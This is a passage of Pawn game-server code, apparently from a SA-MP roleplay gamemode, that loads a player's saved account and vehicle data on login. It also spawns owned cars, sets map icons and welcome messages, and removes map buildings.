        PlayerInfo[playerid][pCigarettes] = cache_get_row_int(0,71,handle);
        PlayerInfo[playerid][pLanguage] = cache_get_row_int(0,72,handle),
        PlayerInfo[playerid][pLawyerPoint] = cache_get_row_int(0,73,handle),
        PlayerInfo[playerid][pApproval] = cache_get_row_int(0,74,handle),
        PlayerInfo[playerid][pWanted] = cache_get_row_int(0,75,handle),
        PlayerInfo[playerid][cLocationx] = cache_get_row_float(0,76,handle);
        PlayerInfo[playerid][cLocationy] = cache_get_row_float(0,77,handle);
        PlayerInfo[playerid][cLocationz] = cache_get_row_float(0,78,handle),
        PlayerInfo[playerid][cAngle] = cache_get_row_float(0,79,handle),
        PlayerInfo[playerid][cColor1] = cache_get_row_int(0,80,handle);
        PlayerInfo[playerid][cColor2] = cache_get_row_int(0,81,handle);
        PlayerInfo[playerid][cModel] = cache_get_row_int(0,82,handle),
        PlayerInfo[playerid][cPrice] = cache_get_row_int(0,83,handle);
        if(PlayerInfo[playerid][pReg] == 1) { cache_get_row(0,84,PlayerInfo[playerid][cPlate],handle,128);}
        PlayerInfo[playerid][cLock] = cache_get_row_int(0,85,handle),
        PlayerInfo[playerid][cDestroyed] = cache_get_row_int(0,86,handle);
        PlayerInfo[playerid][cFuel] = cache_get_row_int(0,87,handle),
        PlayerInfo[playerid][cHealth] = cache_get_row_float(0,88,handle),
        PlayerInfo[playerid][cMod1] = cache_get_row_int(0,89,handle);
        PlayerInfo[playerid][cMod3] = cache_get_row_int(0,90,handle),
        PlayerInfo[playerid][cMod4] = cache_get_row_int(0,91,handle),
        PlayerInfo[playerid][cMod5] = cache_get_row_int(0,92,handle),
        PlayerInfo[playerid][cMod6] = cache_get_row_int(0,93,handle),
        PlayerInfo[playerid][cMod7] = cache_get_row_int(0,94,handle);
        PlayerInfo[playerid][cMod8] = cache_get_row_int(0,95,handle),
        PlayerInfo[playerid][cMod9] = cache_get_row_int(0,96,handle),
        PlayerInfo[playerid][cMod10] = cache_get_row_int(0,97,handle),
        PlayerInfo[playerid][cMod11] = cache_get_row_int(0,98,handle);
        PlayerInfo[playerid][cMod12] = cache_get_row_int(0,99,handle),
        PlayerInfo[playerid][cMod13] = cache_get_row_int(0,100,handle),
        PlayerInfo[playerid][cMod14] = cache_get_row_int(0,101,handle);
        PlayerInfo[playerid][cMod15] = cache_get_row_int(0,102,handle),
        PlayerInfo[playerid][cMod16] = cache_get_row_int(0,103,handle),
        PlayerInfo[playerid][cMod17] = cache_get_row_int(0,104,handle),
        PlayerInfo[playerid][cPaintJob] = cache_get_row_int(0,105,handle);
        PlayerInfo[playerid][cKilo] = cache_get_row_float(0,106,handle),
        PlayerInfo[playerid][cPanel] = cache_get_row_int(0,107,handle),
        PlayerInfo[playerid][cDoors] = cache_get_row_int(0,108,handle),
        PlayerInfo[playerid][cLights] = cache_get_row_int(0,109,handle),
        PlayerInfo[playerid][cTires] = cache_get_row_int(0,110,handle),
        PlayerInfo[playerid][cFixed] = cache_get_row_int(0,111,handle);
        if(PlayerInfo[playerid][pReg] == 1) { cache_get_row(0,112,PlayerInfo[playerid][pEmail],handle,128);}
        PlayerInfo[playerid][pBanned] = cache_get_row_int(0,113,handle);
        if(PlayerInfo[playerid][pReg] == 1) { cache_get_row(0,115,PlayerInfo[playerid][pBanReason],handle,128);}
        PlayerInfo[playerid][cInsurance] = cache_get_row_int(0,116,handle);
        if(PlayerInfo[playerid][pReg] == 1) { cache_get_row(0,117,PlayerInfo[playerid][pBannedBy],handle,40);}
        if(PlayerInfo[playerid][pReg] == 1) { cache_get_row(0,118,PlayerInfo[playerid][pBanTime],handle,260);}
        PINFO[playerid][pID] = cache_get_row_int(0,119,handle);
        PINFO[playerid][pHelper] = cache_get_row_int(0,120,handle);
        PINFO[playerid][pGetHitTime] = cache_get_row_int(0,121,handle);
        PINFO[playerid][pCar_2] = cache_get_row_int(0,122,handle);
        PINFO[playerid][cLocationx_2] = cache_get_row_float(0,123,handle);
        PINFO[playerid][cLocationy_2] = cache_get_row_float(0,124,handle);
        PINFO[playerid][cLocationz_2] = cache_get_row_float(0,125,handle);
        PINFO[playerid][cAngle_2] = cache_get_row_float(0,126,handle);
        PINFO[playerid][cColor1_2] = cache_get_row_int(0,127,handle);
        PINFO[playerid][cColor2_2] = cache_get_row_int(0,128,handle);
        PINFO[playerid][cModel_2] = cache_get_row_int(0,129,handle);
        PINFO[playerid][cPrice_2] = cache_get_row_int(0,130,handle);
        if(PlayerInfo[playerid][pReg] == 1) { cache_get_row(0,131,PINFO[playerid][cPlate_2],handle,128); }
        PINFO[playerid][cLock_2] = cache_get_row_int(0,132,handle);
        PINFO[playerid][cDestroyed_2] = cache_get_row_int(0,133,handle);
        PINFO[playerid][cFuel_2] = cache_get_row_int(0,134,handle);
        PINFO[playerid][cHealth_2] = cache_get_row_float(0,135,handle);
        PINFO[playerid][cMod1_2] = cache_get_row_int(0,136,handle);
        PINFO[playerid][cMod3_2] = cache_get_row_int(0,137,handle);
        PINFO[playerid][cMod4_2] = cache_get_row_int(0,138,handle);
        PINFO[playerid][cMod5_2] = cache_get_row_int(0,139,handle);
        PINFO[playerid][cMod6_2] = cache_get_row_int(0,140,handle);
        PINFO[playerid][cMod7_2] = cache_get_row_int(0,141,handle);
        PINFO[playerid][cMod8_2] = cache_get_row_int(0,142,handle);
        PINFO[playerid][cMod9_2] = cache_get_row_int(0,143,handle);
        PINFO[playerid][cMod10_2] = cache_get_row_int(0,144,handle);
        PINFO[playerid][cMod11_2] = cache_get_row_int(0,145,handle);
        PINFO[playerid][cMod12_2] = cache_get_row_int(0,146,handle);
        PINFO[playerid][cMod13_2] = cache_get_row_int(0,147,handle);
        PINFO[playerid][cMod14_2] = cache_get_row_int(0,148,handle);
        PINFO[playerid][cMod15_2] = cache_get_row_int(0,149,handle);
        PINFO[playerid][cMod16_2] = cache_get_row_int(0,150,handle);
        PINFO[playerid][cMod17_2] = cache_get_row_int(0,151,handle);
        PINFO[playerid][cPaintJob_2] = cache_get_row_int(0,152,handle);
        PINFO[playerid][cKilo_2] = cache_get_row_float(0,153,handle);
        PINFO[playerid][cPanel_2] = cache_get_row_int(0,154,handle);
        PINFO[playerid][cDoors_2] = cache_get_row_int(0,155,handle);
        PINFO[playerid][cLights_2] = cache_get_row_int(0,156,handle);
        PINFO[playerid][cTires_2] = cache_get_row_int(0,157,handle);
        PINFO[playerid][cFixed_2] = cache_get_row_int(0,158,handle);
        PINFO[playerid][cInsurance_2] = cache_get_row_int(0,159,handle);
        PINFO[playerid][pReferral] = cache_get_row_int(0, 160, handle);
        PINFO[playerid][gLocationX] = cache_get_row_float(0, 161, handle);
        PINFO[playerid][gLocationY] = cache_get_row_float(0, 162, handle);
        PINFO[playerid][gLocationZ] = cache_get_row_float(0, 163, handle);
        PINFO[playerid][gAngle] = cache_get_row_float(0, 164, handle);
        PINFO[playerid][gLocationX_2] = cache_get_row_float(0, 165, handle);
        PINFO[playerid][gLocationY_2] = cache_get_row_float(0, 166, handle);
        PINFO[playerid][gLocationZ_2] = cache_get_row_float(0, 167, handle);
        PINFO[playerid][gAngle_2] = cache_get_row_float(0, 168, handle);
        PINFO[playerid][gParked] = cache_get_row_int(0, 169, handle);
        PINFO[playerid][gParked_2] = cache_get_row_int(0, 170, handle);
        PINFO[playerid][pClan] = cache_get_row_int(0, 171, handle);
        PINFO[playerid][pcRank] = cache_get_row_int(0, 172, handle);
        PINFO[playerid][pRep] = cache_get_row_int(0, 173, handle);
		PINFO[playerid][pCwarn] = cache_get_row_int(0, 174, handle);
		PINFO[playerid][pLav] = cache_get_row_int(0, 176, handle);
		PINFO[playerid][pAav] = cache_get_row_int(0, 177, handle);
		PINFO[playerid][pHav] = cache_get_row_int(0, 178, handle);
		PINFO[playerid][pHav] = cache_get_row_int(0, 179, handle);
		PlayerInfo[playerid][pPinCode] = cache_get_row_int(0, 180, handle);
		PINFO[playerid][pGold] = cache_get_row_int(0, 181, handle);
		cache_get_row(0,182,PlayerInfo[playerid][pBio],handle);
	//	PlayerInfo[playerid][pGetWeb] = cache_get_row_int(0,183,handle);
		
        RequestSelected[playerid] = false;
        if(KickLoginUsed[playerid] == true)
        {
            KillTimer(KickLogin[playerid]);
            KickLoginUsed[playerid] = false;
        }
        ResetPlayerTofang(playerid);
        ResetPlayerPool(playerid);
        GivePlayerPool(playerid,PlayerInfo[playerid][pCash]);
        gPlayerLogged[playerid] = 1;
        SaveKonStr(playerid, "pIp", PINFO[playerid][pIp]);
        /*new IPstr[MAX_PLAYERS][19], b = 0;
        for(new i = 0;i<LastPID;i++)
        {
            if(IsPlayerConnected(i) && i != playerid)
            {
                GetPlayerIp(i, IPstr[b], 19);
                b++;
            }
        }
        for(new i = 0;i<b;i++)
        {
            if(!strcmp(PINFO[playerid][pIp], IPstr[i], true))
            {
                if((PINFO[i][pPremiumAccount] < 1 && PINFO[playerid][pPremiumAccount] < 1) && i != playerid && gPlayerLogged[i] == 1)
                {
                    new str[256];
                    format(str, 256, "** You have the same IP (%s) as %s (Kicked) **",PINFO[playerid][pIp], PINFO[i][pName]);
                    SCM(playerid,COLOR_LIGHTRED,str);
                    KickWithMessage(playerid,COLOR_LIGHTRED, "** If you want to play from more computers on the same IP you have to buy Premium Account **");
                    return 1;
                }
            }
        }*/
        if(PlayerInfo[playerid][pReg] == 0)
        {
            PlayerInfo[playerid][pLevel] = 1;
            PlayerInfo[playerid][pTeam] = TEAM_CIV;
            new rand = RandomShomare(1000000,9999999);
            SetPlayerNumber(playerid,INVALID_PLAYER_ID,rand);
            PlayerInfo[playerid][pPhousekey] = 9999;
			PlayerInfo[playerid][pRep] = 0;
            PlayerInfo[playerid][pCar] = 0;//Nemikhad save she
            PINFO[playerid][pCar_2] = 0;//Nemikhad save she
            PlayerInfo[playerid][pPbiskey] = 9999;
            PlayerInfo[playerid][pAccount] = 100;
            GivePlayerPool(playerid, 150);
            new string[256];
            new d,m,y;
            getdate(y,m,d);
            format(string,sizeof(string), "%s%d/%s%d/%s%d",(d < 10) ? ("0") : (""),d,(m < 10) ? ("0") : (""),m,(y < 10) ? ("0") : (""),y);
            strmid(PlayerInfo[playerid][pRegistredDate], string, 0, strlen(string), 255);
            SaveKonVal(playerid, "pLevel", 1);
            SaveKonVal(playerid, "pTeam", TEAM_CIV);
            SaveKonVal(playerid, "pPhousekey", 9999);
            SaveKonVal(playerid, "pPbiskey", 9999);
            SaveKonVal(playerid, "pAccount", 100);
            SaveKonStr(playerid, "pRegistredDate", string);
            SaveKonStr(playerid, "pLastLogin", PINFO[playerid][pLastLogin]);
            SaveKonStr(playerid, "pMarriedTo", PINFO[playerid][pMarriedTo]);
            SaveKonStr(playerid, "cPlate", PINFO[playerid][cPlate]);
            SaveKonStr(playerid, "pEmail", PINFO[playerid][pEmail]);
            SaveKonStr(playerid, "pBanReason", PINFO[playerid][pBanReason]);
            SaveKonStr(playerid, "pBannedBy", PINFO[playerid][pBannedBy]);
            SaveKonStr(playerid, "pBanTime", PINFO[playerid][pBanTime]);
            SaveKonStr(playerid, "cPlate_2", PINFO[playerid][cPlate_2]);
            
            pIntro[playerid] = 1
			UpdatePlayerIntro(playerid); // We start player intro check;
        }
        if(PlayerInfo[playerid][pCar] != 0)
        {
            if(PINFO[playerid][gParked] == 0)
            {
                new model = PlayerInfo[playerid][cModel];
                new Float:posx = PlayerInfo[playerid][cLocationx];
                new Float:posy = PlayerInfo[playerid][cLocationy];
                new Float:posz = PlayerInfo[playerid][cLocationz];
                new Float:angle = PlayerInfo[playerid][cAngle];
                new color1 = PlayerInfo[playerid][cColor1];
                new color2 = PlayerInfo[playerid][cColor2];
                new carid = CreateVehicle(model,posx,posy,posz,angle,color1,color2,-1);
                if(PlayerInfo[playerid][cHealth] <= 249.9)
                {
                    PlayerInfo[playerid][cHealth] = 1000.0;
                    SaveKonFloat(playerid, "cHealth", 1000);
                    if(PINFO[playerid][cInsurance] <= 0)
                    {
                        PINFO[playerid][cFixed] = 0;
                        SaveKonVal(playerid, "cFixed", 0);
                    }
                    else
                    {
                        PINFO[playerid][cInsurance] --;
                        SaveKonVal(playerid, "cInsurance", PINFO[playerid][cInsurance]);
                    }
                }
                OwnedMashin[carid] = 1;
                MashinOwner[carid] = playerid;
                SetVehicleNumberPlate(carid,PlayerInfo[playerid][cPlate]);
                PlayerInfo[playerid][pCar] = carid;
                SaveKonVal(playerid, "pCar", carid);
                Benzin[carid] = PlayerInfo[playerid][cFuel];
                SetVehicleHealthEx(carid,PlayerInfo[playerid][cHealth]);
                ModVehicle(playerid,carid);
                UpdateVehicleDamageStatus(carid,PINFO[playerid][cPanel],PINFO[playerid][cDoors],PINFO[playerid][cLights],PINFO[playerid][cTires]);
                PlayerInfo[playerid][cLock] = 1;
                SaveKonVal(playerid, "cLock", 1);
                for(new i = 0; i < LastPID; i++ )
                {
                    if(IsPlayerConnected(i)) SetVehicleParamsForPlayer(carid,i,0,1);
                }
            }
        }
        if(PlayerInfo[playerid][pCar_2] != 0)
        {
            if(PINFO[playerid][gParked_2] == 0)
            {
                new model = PlayerInfo[playerid][cModel_2];
                new Float:posx = PlayerInfo[playerid][cLocationx_2];
                new Float:posy = PlayerInfo[playerid][cLocationy_2];
                new Float:posz = PlayerInfo[playerid][cLocationz_2];
                new Float:angle = PlayerInfo[playerid][cAngle_2];
                new color1 = PlayerInfo[playerid][cColor1_2];
                new color2 = PlayerInfo[playerid][cColor2_2];
                new carid = CreateVehicle(model,posx,posy,posz,angle,color1,color2,-1);
                if(PlayerInfo[playerid][cHealth_2] <= 249.9)
                {
                    PlayerInfo[playerid][cHealth_2] = 1000.0;
                    SaveKonFloat(playerid, "cHealth_2", 1000);
                    if(PINFO[playerid][cInsurance_2] <= 0)
                    {
                        PINFO[playerid][cFixed_2] = 0;
                        SaveKonVal(playerid, "cFixed_2", 0);
                    }
                    else
                    {
                        PINFO[playerid][cInsurance_2] --;
                        SaveKonVal(playerid, "cInsurance_2", PINFO[playerid][cInsurance_2]);
                    }
                }
                OwnedMashin_2[carid] = 1;
                MashinOwner_2[carid] = playerid;
                SetVehicleNumberPlate(carid,PlayerInfo[playerid][cPlate_2]);
                PlayerInfo[playerid][pCar_2] = carid;
                SaveKonVal(playerid, "pCar_2", carid);
                Benzin[carid] = PlayerInfo[playerid][cFuel_2];
                SetVehicleHealthEx(carid,PlayerInfo[playerid][cHealth_2]);
                ModVehicle(playerid,carid);
                UpdateVehicleDamageStatus(carid,PINFO[playerid][cPanel_2],PINFO[playerid][cDoors_2],PINFO[playerid][cLights_2],PINFO[playerid][cTires_2]);
                PlayerInfo[playerid][cLock_2] = 1;
                SaveKonVal(playerid, "cLock_2", 1);
                for(new i = 0; i < LastPID; i++ )
                {
                    if(IsPlayerConnected(i)) SetVehicleParamsForPlayer(carid,i,0,1);
                }
            }
        }

       TextDrawHideForPlayer(playerid,atxd[0]);
            TextDrawHideForPlayer(playerid,atxd[1]);
            TextDrawHideForPlayer(playerid,atxd[2]);
            TextDrawHideForPlayer(playerid,atxd[3]);
            TextDrawHideForPlayer(playerid,atxd[4]);
            TextDrawHideForPlayer(playerid,atxd[5]);
            TextDrawHideForPlayer(playerid,atxd[6]);
            TextDrawHideForPlayer(playerid,atxd[7]);
            TextDrawHideForPlayer(playerid,atxd[8]);
        //TextDrawHideForPlayer(playerid,AccountBar[3]);
//		TextDrawHideForPlayer(playerid,TD_ConnectUp[0]);
        SetPlayerMapIcon(playerid, 1, 1193.8523,-918.9190,43.1762, 10, COLOR_YELLOW);//burger shot LS
        SetPlayerMapIcon(playerid, 2, 2469.7820,2018.0828,16.0938, 10, COLOR_YELLOW);//burger shot LV
        SetPlayerMapIcon(playerid, 3, 2392.5093,2041.5692,10.8203, 14, COLOR_YELLOW);//cluckin bell LV
        SetPlayerMapIcon(playerid, 4, 2441.1169,2065.3987,10.8203, 49, COLOR_YELLOW);   // the craw bar
        SetPlayerMapIcon(playerid, 6, 1528.779, -1678.113, 5.890625, 30, COLOR_YELLOW);  // Police Station
        SetPlayerMapIcon(playerid, 7, 1461.695, -1011.915, 26.84375, 52, COLOR_YELLOW);  // Bank LS
        SetPlayerMapIcon(playerid, 8, 2577.4768,1325.4229,10.8203, 52, COLOR_YELLOW);  // Bank LV
        SetPlayerMapIcon(playerid, 9, 2169.4907,2795.8733,10.8203, 10, COLOR_YELLOW);//burger shot LV
        SetPlayerMapIcon(playerid, 10, 2420.0530,-1508.8719,24.0000, 14, COLOR_YELLOW);//cluckin bell LS
        SetPlayerMapIcon(playerid, 11, 2312.9451,-1645.0206,14.8270, 49, COLOR_YELLOW); // Ten Green
        SetPlayerMapIcon(playerid, 12, 1831.4663,-1683.2169,13.2197, 48, COLOR_YELLOW); // Alhambra
        SetPlayerMapIcon(playerid, 13, 1498.4476,-1582.8242,13.5469, 50, COLOR_YELLOW); // Restaurant
        SetPlayerMapIcon(playerid, 14, 2023.1091,1919.9839,12.3394, 48, COLOR_YELLOW);  // Gun Dealer Reg.
        SetPlayerMapIcon(playerid, 15, 2638.2974,1671.8569,11.0234, 14, COLOR_YELLOW);//cluckin bell LV
        SetPlayerMapIcon(playerid, 16, 2638.3850,1849.7784,11.0234, 29, COLOR_YELLOW);//LV PIZZZA
        SetPlayerMapIcon(playerid, 17, 1158.0591,2072.2092,11.0625, 10, COLOR_YELLOW);//LV BURGER
        SetPlayerMapIcon(playerid, 18, 2845.8950,2415.3938,11.0690, 14, COLOR_YELLOW);//CLUCKBELL LV
        SetPlayerMapIcon(playerid, 19, 2105.4858,-1806.4725,13.5547, 29, COLOR_YELLOW); // Pizza stack
        SetPlayerMapIcon(playerid, 20, 2229.9011,-1721.2582,13.5613, 54, COLOR_YELLOW); // Gym
        SetPlayerMapIcon(playerid, 21, 2756.7285,2477.2551,11.0625, 29, COLOR_YELLOW); // pizza
        SetPlayerMapIcon(playerid, 22, 1791.4263,-1163.9659,23.8281, 6, COLOR_YELLOW); // gsls
        SetPlayerMapIcon(playerid, 23, 2596.6951,1095.6530,10.8222, 6, COLOR_YELLOW); // gslv
        SetPlayerMapIcon(playerid, 24, 2229.9072,-1721.2985,13.5617, 54, COLOR_YELLOW); // Gym
        SetPlayerMapIcon(playerid, 25, 2596.5083,1095.5210,10.8222, 18, COLOR_YELLOW); // GSLV
        SetPlayerMapIcon(playerid, 26, 1791.3075,-1164.2156,23.8281, 6, COLOR_YELLOW); // GSLS
        SetPlayerMapIcon(playerid, 27, 2020.2828,1007.7108,10.8203, 44, COLOR_YELLOW); // 4dragons
        SetPlayerMapIcon(playerid, 28, 1177.699951,-1325.000000,14.083624, 22, COLOR_YELLOW); // LS hospital 2
        if(PINFO[playerid][pPhousekey] != 9999)
        {
            new h = PINFO[playerid][pPhousekey];
            SetPlayerMapIcon(playerid,30,HouseInfo[h][hExitx],HouseInfo[h][hExity],HouseInfo[h][hExitz],31,COLOR_LIGHTRED,MAPICON_GLOBAL);
        }
        if(PINFO[playerid][pWanted] > 6) {PINFO[playerid][pWanted] = 6; SaveKonVal(playerid, "pWanted", 6);}
        if(PlayerInfo[playerid][pWanted] >= 1)
        {
            new str4[128];
            format(str4,sizeof(str4),"When you left the server you had %d wanted level(s).",PlayerInfo[playerid][pWanted]);
            SCM(playerid,COLOR_LIGHTRED,str4);
            SetPlayerWantedLevel(playerid,PlayerInfo[playerid][pWanted]);
        }
        PaymecTime[playerid] = SetTimerEx("Paymec", 60000, true, "i", playerid);
        HealthTimer[playerid] = SetTimerEx("HealthKamKon", 40000, true, "i", playerid);
        TextDrawShowForPlayer(playerid, Time);
        TextDrawShowForPlayer(playerid, Date);
        TextDrawShowForPlayer(playerid, TD_Site);
        TextDrawShowForPlayer(playerid, TD_Site1);
        new string[256];
        new dd,mm,yy;
        new ore,mn,sec;
        getdate(yy,mm,dd);
        gettime(ore,mn,sec);
        format(string,sizeof(string), "%s%d.%s%d.%s%d  %s%d:%s%d", (dd < 10) ? ("0") : (""),dd, (mm < 10) ? ("0") : (""),mm, (yy < 10) ? ("0") : (""),yy, (ore < 10) ? ("0") : (""),ore,(mn < 10) ? ("0") : (""),mn);
        strmid(PlayerInfo[playerid][pLastLogin], string, 0, strlen(string), 255);
        SaveKonStr(playerid, "pLastLogin", PINFO[playerid][pLastLogin]);
        ResetPlayerTofang(playerid);
		if(PlayerInfo[playerid][pClan] != 0) {
		new c = PlayerInfo[playerid][pClan];
		GivePlayerTag(playerid, DynamicClans[c][cTag]);
		}

        printf("%s has logged in.",playername2);
        if(IsAMemberC(playerid))
        {
            new famil;
            if(PlayerInfo[playerid][pLeader]) famil = PlayerInfo[playerid][pLeader];
            else famil = PlayerInfo[playerid][pMember];
            for(new z = 0;z<30;z++)
            {
                if(TurfAttacker[z] == famil || TurfKhod[z] == famil)
                {
                    OnWar[playerid] = z;
                    SCM(playerid,COLOR_JOB,"[Turfs]: Faction Shoma War Darad. /Wartime");
                }
            }
        }
        if(PINFO[playerid][pHeadValue] > 0)
        {
            ContractID[playerid] = ReturnContractID();
            ContractIDUsed[ReturnContractID()] = true;
            ContractsCount ++;
        }
        if(PlayerInfo[playerid][pReg] == 1)
        {
      	SetSpawnKol(playerid);
		SpawnPlayer(playerid);
  		TogglePlayerSpectating(playerid, 0);
        PlayerRespawned[playerid] = 0;
        AntiKhoonHack[playerid] = SetTimerEx("KhoonTimer",2000,1,"i",playerid);

        }
    }
    return 1;
}
forward FirstSpawn(playerid);
forward FirstSpawn2(playerid);

public FirstSpawn2(playerid)
{
	if(IsPlayerConnected(playerid))
	{
	    //OnFirstSpawn[playerid] = false;
		TextDrawSize[playerid] =0;
		TextDrawShowForPlayer(playerid,TD_pConnectUp[playerid]);
		TextDrawShowForPlayer(playerid,TD_ConnectUp[1]);
		TextDrawShowForPlayer(playerid,TD_ConnectUp[2]);
		TimerTD[playerid] = SetTimerEx("SizeTextdraw",50,true, "i", playerid);
		IsPlayerSpawnedForMessage[playerid] =1;
		TogglePlayerControllable(playerid, 0);
	    SetPlayerInterior(playerid, 0);
		SetPlayerCameraPos(playerid, 2108.5417, -1090.2677, 137.6130);
		SetPlayerCameraLookAt(playerid,1969.7505,-1201.7192,25.5910);
  		SetPlayerPosEx(playerid,2042.2998,-1167.9678,8.3464);
		SetPlayerFacingAngle(playerid,123);
		SetPlayerInterior(playerid, 0);
		TextDrawShowForPlayer(playerid,TD_LoadingAccount[0]);
		TextDrawShowForPlayer(playerid,TD_LoadingAccount[1]);
		TextDrawShowForPlayer(playerid,TD_LoadingAccount[2]);
	   	SetTimerEx("FirstSpawn", 3000, false, "i", playerid);
	   	return 1;
	}
	return 1;
}
public FirstSpawn(playerid)
{
    //OnFirstSpawn[playerid] = false;
	IsLogedIn[playerid] = true;
	SetSpawnKol(playerid);
	SpawnPlayer(playerid);
	TogglePlayerSpectating(playerid, 0);
	TogglePlayerControllable(playerid, 1);
	new string[256];
	format(string, sizeof(string), "Khosh Omadi {57e547}%s{FFFFFF}!",PlayerName(playerid));
	SCM(playerid,COLOR_WHITE,string);
	if (PlayerInfo[playerid][pAdmin] != 0)
	{
		format(string, sizeof(string), "Your Admin Level is {57e547}%d",PlayerInfo[playerid][pAdmin]);
		SendClientMessage(playerid, COLOR_WHITE,string);
	}
	if(PINFO[playerid][pHelper] != 0)
	{
		format(string, sizeof(string), "Your Helper Level is {57e547}%d",PINFO[playerid][pHelper]);
		SendClientMessage(playerid,COLOR_WHITE,string);
	}
	if(PlayerInfo[playerid][pPremiumAccount] == 1) SCM(playerid,COLOR_WHITE,"{FFFFFF}You Have {57e547}Premium Account{FFFFFF}.");
	if(PlayerInfo[playerid][pPremiumAccount] == 100) SCM(playerid,COLOR_WHITE,"{FFFFFF}Shoma {57e547}Vip Account{FFFFFF} Hastid.");
	if(PlayerInfo[playerid][fSkin] != 0) SetPlayerSkin(playerid, PlayerInfo[playerid][fSkin]);
	else SetPlayerSkin(playerid, PlayerInfo[playerid][cSkin]);
	if(PlayerInfo[playerid][pPinCode] == 0) SendClientMessage(playerid,COLOR_RED,"Account Shoma PIN Code Nadarad. PIN Code Baraie Amniat Bishtar Account Shomas. /PinCode");
	if(PlayerInfo[playerid][pPinCode] != 0)
	{
		AccountLock[playerid] =1;
		SendClientMessage(playerid,COLOR_RED," {FFFFFF}Account Shoma {57e547}Ghofl {FFFFFF}Ast.");
		OnPlayerCommandText(playerid, "/pin");
	}
	new str[40];
	format(str,sizeof(str),"%s (%d)",PlayerName(playerid),playerid);
	TextDrawSetString(TD_PlayerName[playerid] , str);
	TextDrawShowForPlayer(playerid,TD_PlayerName[playerid]);
	//test
RemoveBuildingForPlayer(playerid, 5856, 1024.9844, -1029.3516, 33.1953, 0.25);

//----------------------------------------------------------[DisCo - CluB]
	RemoveBuildingForPlayer(playerid, 1823, 482.0625, -25.0938, 1002.0781, 0.25);
	RemoveBuildingForPlayer(playerid, 1544, 482.3906, -24.8672, 1002.5625, 0.25);
	RemoveBuildingForPlayer(playerid, 1754, 482.0469, -23.2891, 1002.0938, 0.25);
	RemoveBuildingForPlayer(playerid, 1544, 482.8906, -24.5547, 1002.5625, 0.25);
	RemoveBuildingForPlayer(playerid, 2290, 483.5156, -26.3516, 1002.0859, 0.25);
	RemoveBuildingForPlayer(playerid, 1754, 484.1250, -24.6172, 1002.0938, 0.25);
	RemoveBuildingForPlayer(playerid, 2670, 479.5078, -20.3828, 999.7813, 0.25);
	RemoveBuildingForPlayer(playerid, 1754, 485.4531, -24.7031, 1002.0938, 0.25);
	RemoveBuildingForPlayer(playerid, 1823, 486.3906, -25.2891, 1002.0781, 0.25);
	RemoveBuildingForPlayer(playerid, 1544, 486.6797, -24.6406, 1002.5625, 0.25);
	RemoveBuildingForPlayer(playerid, 1544, 486.8125, -24.7500, 1002.5625, 0.25);
	RemoveBuildingForPlayer(playerid, 2290, 487.8203, -26.3516, 1002.0859, 0.25);
	RemoveBuildingForPlayer(playerid, 1544, 487.2031, -24.5859, 1002.5625, 0.25);
	RemoveBuildingForPlayer(playerid, 1544, 487.1797, -25.1094, 1002.5625, 0.25);
	RemoveBuildingForPlayer(playerid, 1754, 488.4219, -25.1719, 1002.0938, 0.25);
	RemoveBuildingForPlayer(playerid, 1754, 488.0313, -23.3906, 1002.0938, 0.25);
	RemoveBuildingForPlayer(playerid, 2670, 490.6328, -24.3906, 999.7813, 0.25);
	RemoveBuildingForPlayer(playerid, 1547, 501.1641, -23.7813, 1000.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 1544, 501.0469, -22.2813, 1000.7422, 0.25);
	RemoveBuildingForPlayer(playerid, 1547, 501.1094, -22.8125, 1000.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 1548, 501.1094, -21.2266, 1000.7344, 0.25);
	RemoveBuildingForPlayer(playerid, 2670, 478.2188, -19.4141, 999.7813, 0.25);
	RemoveBuildingForPlayer(playerid, 1544, 477.2109, -16.1016, 1003.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 1544, 477.3203, -13.9375, 1003.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 1547, 500.9766, -19.2344, 1000.7266, 0.25);
	RemoveBuildingForPlayer(playerid, 1548, 501.1250, -18.1172, 1000.7344, 0.25);
	RemoveBuildingForPlayer(playerid, 1544, 503.3906, -17.6172, 1001.3438, 0.25);
	RemoveBuildingForPlayer(playerid, 1544, 503.3516, -17.8047, 1001.3438, 0.25);
	RemoveBuildingForPlayer(playerid, 1544, 503.5625, -17.6406, 1001.3438, 0.25);
	RemoveBuildingForPlayer(playerid, 1544, 503.5625, -17.4453, 1001.3438, 0.25);
	RemoveBuildingForPlayer(playerid, 2670, 478.1953, -7.1719, 999.7813, 0.25);
	RemoveBuildingForPlayer(playerid, 2670, 478.6016, -7.6953, 999.7813, 0.25);
	RemoveBuildingForPlayer(playerid, 1436, 479.5938, -8.9922, 1001.2188, 0.25);
	RemoveBuildingForPlayer(playerid, 2670, 479.2891, -5.4063, 1001.1797, 0.25);
	RemoveBuildingForPlayer(playerid, 2670, 479.8203, -5.8125, 1001.1797, 0.25);
	RemoveBuildingForPlayer(playerid, 1544, 480.8594, -5.0156, 1002.2656, 0.25);
	RemoveBuildingForPlayer(playerid, 1436, 479.5938, -4.2969, 1002.6328, 0.25);
	RemoveBuildingForPlayer(playerid, 2670, 501.4141, -7.5547, 999.7813, 0.25);
	RemoveBuildingForPlayer(playerid, 2779, 501.4688, -10.3672, 999.6797, 0.25);
	RemoveBuildingForPlayer(playerid, 2778, 502.4063, -7.5313, 999.6797, 0.25);
	RemoveBuildingForPlayer(playerid, 2681, 503.6484, -7.5156, 999.6797, 0.25);
	RemoveBuildingForPlayer(playerid, 1544, 495.0078, -5.4453, 1002.2656, 0.25);
	RemoveBuildingForPlayer(playerid, 1544, 495.2031, -5.3828, 1002.2656, 0.25);
	RemoveBuildingForPlayer(playerid, 2670, 497.1563, -7.1094, 999.7813, 0.25);
	RemoveBuildingForPlayer(playerid, 2670, 505.6797, -7.0156, 999.7813, 0.25);
	RemoveBuildingForPlayer(playerid, 2653, 506.1406, -4.3672, 1004.2109, 0.25);
	RemoveBuildingForPlayer(playerid, 2670, 502.1641, -1.8906, 999.7813, 0.25);
	RemoveBuildingForPlayer(playerid, 2670, 499.8438, -1.6172, 999.7813, 0.25);
	RemoveBuildingForPlayer(playerid, 2670, 505.8125, -1.5625, 999.7813, 0.25);
	RemoveBuildingForPlayer(playerid, 1776, 500.5625, -1.3672, 1000.7344, 0.25);
	RemoveBuildingForPlayer(playerid, 1775, 501.8281, -1.4297, 1000.7344, 0.25);
//----------------------------------------------------------[DisCo - CluB]
//--------------------------------------------------------[VineWoodNewCreateByHaSaN]
RemoveBuildingForPlayer(playerid, 13759, 1413.4141, -804.7422, 83.4375, 0.25);
